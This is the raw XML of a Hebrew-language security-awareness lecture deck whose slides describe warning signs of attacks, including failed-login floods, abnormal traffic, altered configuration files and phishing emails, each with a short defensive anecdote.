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72" r:id="rId14"/>
    <p:sldId id="266" r:id="rId15"/>
    <p:sldId id="267" r:id="rId16"/>
    <p:sldId id="268" r:id="rId17"/>
    <p:sldId id="269"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7" r:id="rId42"/>
    <p:sldId id="298" r:id="rId43"/>
    <p:sldId id="296"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2" r:id="rId76"/>
    <p:sldId id="333" r:id="rId77"/>
    <p:sldId id="334" r:id="rId78"/>
    <p:sldId id="335" r:id="rId79"/>
    <p:sldId id="330" r:id="rId80"/>
    <p:sldId id="331"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60" r:id="rId103"/>
    <p:sldId id="361" r:id="rId104"/>
    <p:sldId id="362" r:id="rId105"/>
    <p:sldId id="357" r:id="rId106"/>
    <p:sldId id="363" r:id="rId107"/>
    <p:sldId id="358" r:id="rId108"/>
    <p:sldId id="359" r:id="rId109"/>
    <p:sldId id="364" r:id="rId110"/>
    <p:sldId id="365" r:id="rId111"/>
    <p:sldId id="366" r:id="rId112"/>
    <p:sldId id="367" r:id="rId113"/>
    <p:sldId id="368" r:id="rId114"/>
    <p:sldId id="369" r:id="rId115"/>
    <p:sldId id="370" r:id="rId116"/>
    <p:sldId id="371" r:id="rId117"/>
    <p:sldId id="372" r:id="rId118"/>
    <p:sldId id="375" r:id="rId119"/>
    <p:sldId id="376" r:id="rId120"/>
    <p:sldId id="377" r:id="rId121"/>
    <p:sldId id="378" r:id="rId122"/>
    <p:sldId id="379" r:id="rId123"/>
    <p:sldId id="373" r:id="rId124"/>
    <p:sldId id="374" r:id="rId125"/>
    <p:sldId id="380" r:id="rId126"/>
    <p:sldId id="381" r:id="rId127"/>
    <p:sldId id="383" r:id="rId128"/>
    <p:sldId id="384" r:id="rId129"/>
    <p:sldId id="385" r:id="rId130"/>
    <p:sldId id="386" r:id="rId131"/>
    <p:sldId id="382" r:id="rId132"/>
    <p:sldId id="387" r:id="rId133"/>
    <p:sldId id="388" r:id="rId134"/>
    <p:sldId id="393" r:id="rId135"/>
    <p:sldId id="389" r:id="rId136"/>
    <p:sldId id="390" r:id="rId137"/>
    <p:sldId id="391" r:id="rId138"/>
    <p:sldId id="392" r:id="rId139"/>
    <p:sldId id="394" r:id="rId140"/>
    <p:sldId id="395" r:id="rId141"/>
    <p:sldId id="396" r:id="rId142"/>
    <p:sldId id="397" r:id="rId143"/>
    <p:sldId id="398" r:id="rId144"/>
    <p:sldId id="399" r:id="rId145"/>
    <p:sldId id="400" r:id="rId146"/>
    <p:sldId id="401" r:id="rId1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987" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="63" d="100"/>
          <a:sy n="63" d="100"/>
        </p:scale>
        <p:origin x="6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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>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he-IL"/>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7DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="215439889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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="348337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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>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he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8604504" y="5211060"/>
            <a:ext cx="2112264" cy="228600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="82661734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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="784536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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2927691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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="176091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EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1733994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8" name="Date Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Footer Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="he-IL"/>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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>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24221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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>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he-IL"/>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57DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>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61216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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד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7DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3770057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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד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7DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2468932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13EB0A06-B6DD-4F18-95CA-D33255AA9853}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ח'/אלול/תשפ"ד</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>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he-IL"/>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7DBD1DE-2898-4313-9175-E855C0AAA939}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42608380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1F6516D-660F-4947-A320-C1F3A548B43D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הרצאה 6 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="כותרת משנה 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5DC4F673-6767-4BA5-9818-BF91B194D949}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1559446" y="4602549"/>
            <a:ext cx="9070848" cy="457201"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מרצה: יניב </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>מורדוב</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="855262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444AA285-312F-4465-96ED-5A0E4B9F676A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t>תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3332623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7A8EB09-F387-42C1-9418-F25585B56301}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3309730" y="642594"/>
            <a:ext cx="7815470" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76F2E9DF-30C0-42F6-A23A-C3621C345593}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2411233"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תופעות חשודות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הן אינדיקציות לכך שמערכת או רשת נמצאות תחת סיכון או התקפה. זיהוי תופעות אלה מוקדם יכול למנוע נזקים משמעותיים ולעצור את ההתקפה לפני שהיא מספיקה לגרום לנזק ממשי. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הנה סקירה כללית על תופעות חשודות, עם דוגמאות וסיפורים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אמיתיים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3058905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197BBF5-F3EB-48FE-9F99-04DEC4F90997}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1987826" y="642594"/>
            <a:ext cx="9137374" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. ניסיונות התחברות כושלים מרובים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87A4D828-C2E9-4B1B-A653-BBEF2D2F6D88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניסיונות חוזרים ונשנים להיכנס למערכת עם סיסמאות שגויות הם תופעה מחשידה. תופעה כזו יכולה לרמוז על התקפה מסוג </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Brute Force</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שבה תוקף מנסה לנחש את הסיסמה על ידי ניסוי וטעייה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בארגון גדול, זוהו עשרות אלפי ניסיונות התחברות כושלים לחשבון מנהל מערכת בשעות הלילה. הארגון זיהה שמדובר במתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Brute Force </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חסם את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של התוקף, וחייב את כל המנהלים לשנות סיסמאותיהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3231260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51A5F9E-9F79-47F5-9D5E-6E21F4EAFA80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3856382" y="642594"/>
            <a:ext cx="7268817" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. תעבורה לא שגרתית ברשת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1270C76-F7E4-4895-83C2-9C9C6A7AEA6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תעבורה גבוהה בצורה לא רגילה או תעבורה ממקור או ליעד בלתי צפויים יכולה להצביע על התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Distributed Denial of Service (DDoS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או על תעבורה זדונית אחרת, כמו העברת נתונים רגישים מחוץ לארגון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חברת טכנולוגיה קטנה זיהתה עליה חדה בתעבורת הנתונים שלה, למרות שלא היה שינוי משמעותי בפעילות העסקית. לאחר בדיקה, התברר ששרת החברה נפרץ ושהתוקפים שלחו מידע רגיש לשרתים מחוץ למדינה. החברה עצרה את התעבורה וניתקה את השרתים הפגועים מהרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3122913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52407A8-46F9-4881-9F32-0F15636319F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4601816" y="642594"/>
            <a:ext cx="6523383" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. שינויים בקבצים חיוניים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C35C6F4-2B5F-4544-8E84-DDEE3611CCE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שינויים פתאומיים ולא מוסברים בקבצים קריטיים במערכת, כמו קבצי הגדרות או קבצים רגישים, יכולים להעיד על חדירה למערכת. תוקפים עשויים לשנות או להחליף קבצים אלה כדי להסוות את נוכחותם או לפגוע בתפקוד המערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בארגון פיננסי, אחד השרתים קרס מספר פעמים ביום. בבדיקה נמצאו שינויים לא מוסברים בקבצי התצורה של השרת. לאחר חקירה מעמיקה, גילו שהשרת נפרץ על ידי תוקפים שהתקינו תוכנה זדונית לשם גניבת מידע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1059155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2773AA1-B3DB-41B3-85B0-3BCB71E771A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="715616" y="642594"/>
            <a:ext cx="11002617" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מיילים לא שגרתיים או מיילים מכתובות חשודות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E6745A5C-52D4-4F4B-88E2-950AF25437FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קבלת מיילים חשודים, במיוחד כאלה שמכילים קישורים או קבצים מצורפים, הם תופעה חשודה ומעידים על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מטרת מיילים כאלה היא להטעות את הנמען ולהוביל אותו לחשוף פרטים רגישים או להפעיל קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עובד בחברה קיבל מייל שנראה כאילו נשלח מהנהלת חשבונות, ובו בקשה לעדכן את פרטי החשבון הבנקאי שלו. למזלו, העובד שם לב שהמייל הגיע מכתובת חשודה. לאחר בדיקה, התגלה שמדובר בניסיון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שנועד לגנוב את פרטי החשבון שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
